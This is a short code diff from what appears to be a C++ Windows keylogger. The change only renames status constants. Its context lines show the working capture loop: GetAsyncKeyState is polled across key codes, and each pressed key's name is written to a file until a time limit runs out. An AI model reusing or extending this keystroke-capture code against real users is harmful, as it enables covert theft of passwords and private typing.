@@ -85,7 +85,7 @@ void KeyLogger::keylog() {
 
 	int key;
 	string key_name;
-	status = RUNNING;
+	status = KL_RUNNING;
 	// clear keystroke recorded before
 	for (key = 0x08; key <= 0xE2; key++) {
 		GetAsyncKeyState(key);
@@ -94,7 +94,7 @@ void KeyLogger::keylog() {
 	int end_time = time(0) + max_running_time;
 	while (running && time(0) < end_time) {
 		for (key = 0x08; key <= 0xE2; key++) {
-			if (GetAsyncKeyState(key) & PRESSED) {
+			if (GetAsyncKeyState(key) & KL_PRESSED) {
 				if (getSpecialKey(key, key_name)) {
 					fout << key_name;
 				}
@@ -106,7 +106,7 @@ void KeyLogger::keylog() {
 	}
 
 	fout.close();
-	status = 0;
+	status = KL_FINISHED;
 }
 
 string KeyLogger::getOutputFile() {
